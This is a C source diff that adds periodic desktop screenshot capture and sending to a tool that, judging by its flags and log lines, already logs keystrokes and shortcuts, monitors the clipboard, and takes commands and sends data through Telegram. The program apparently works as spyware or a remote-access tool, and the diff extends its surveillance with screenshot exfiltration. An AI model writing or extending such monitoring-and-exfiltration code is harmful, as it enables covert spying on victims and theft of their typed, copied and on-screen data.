@@ -25,6 +25,8 @@
 #include "logging/logging.h"
 #include "runtime/binding.h"
 #include "runtime/runtime.h"
+#include "screenshot/screenshot.h"
+#include "screenshot/screenshot_output.h"
 #include "telegram/telegram.h"
 #include "telegram/telegram_listener.h"
 
@@ -92,6 +94,9 @@ static void print_usage(FILE *stream) {
       "Telegram\n"
       "  --log-interval <sec>   Interval in seconds to send log files "
       "(5-86400)\n"
+      "  --send-screenshots     Periodically capture and send desktop screenshots\n"
+      "  --screenshot-interval <sec> Interval in seconds to send screenshots (5-86400)\n"
+      "  --no-screenshot        Disable screenshot captures\n"
       "  --send-keyboard        Enable keyboard monitoring\n"
       "  --no-keyboard          Disable keyboard monitoring\n"
       "  --keyboard-shortcuts   Enable capturing shortcut tags ([Ctrl+C], "
@@ -233,6 +238,12 @@ static void print_usage(FILE *stream) {
   c2t_log_info("config", "Periodic Telegram log sending=%s, interval=%llu s",
                c2t_config_get()->telegram_send_logs ? "enabled" : "disabled",
                (unsigned long long)c2t_config_get()->telegram_log_interval_sec);
+  c2t_log_info("config", "Screenshot subsystem=%s (Backend: %s), timer interval=%llu s",
+               c2t_config_get()->disable_screenshot
+                   ? "disabled"
+                   : (c2t_config_get()->telegram_send_screenshots ? "periodic" : "on-demand"),
+               screenshot_get_backend_name(),
+               (unsigned long long)c2t_config_get()->telegram_screenshot_interval_sec);
   c2t_log_info("config", "Clipboard monitoring=%s",
                c2t_config_get()->disable_clipboard ? "disabled" : "enabled");
   c2t_log_info("config", "Keyboard monitoring=%s, inactivity flush=%llu ms",
@@ -283,8 +294,22 @@ static void print_usage(FILE *stream) {
       c2t_runtime_release();
     return 1;
   }
+  if (!c2t_config_get()->disable_screenshot && !screenshot_output_init()) {
+    c2t_log_error("main", "Screenshot subsystem initialization failed");
+    c2t_log_sender_cleanup();
+    if (!c2t_config_get()->disable_keyboard)
+      keyboard_output_cleanup();
+    if (!c2t_config_get()->disable_clipboard)
+      clipboard_output_cleanup();
+    telegram_cleanup();
+    if (!is_worker)
+      c2t_runtime_release();
+    return 1;
+  }
   if (!c2t_telegram_listener_init()) {
     c2t_log_error("main", "Telegram command listener initialization failed");
+    if (!c2t_config_get()->disable_screenshot)
+      screenshot_output_cleanup();
     c2t_log_sender_cleanup();
     if (!c2t_config_get()->disable_keyboard)
       keyboard_output_cleanup();
@@ -332,6 +357,9 @@ static void print_usage(FILE *stream) {
     keyboard_listener_cleanup();
   }
   c2t_telegram_listener_cleanup();
+  if (!c2t_config_get()->disable_screenshot) {
+    screenshot_output_cleanup();
+  }
   c2t_log_sender_cleanup();
   if (!c2t_config_get()->disable_keyboard) {
     keyboard_output_cleanup();
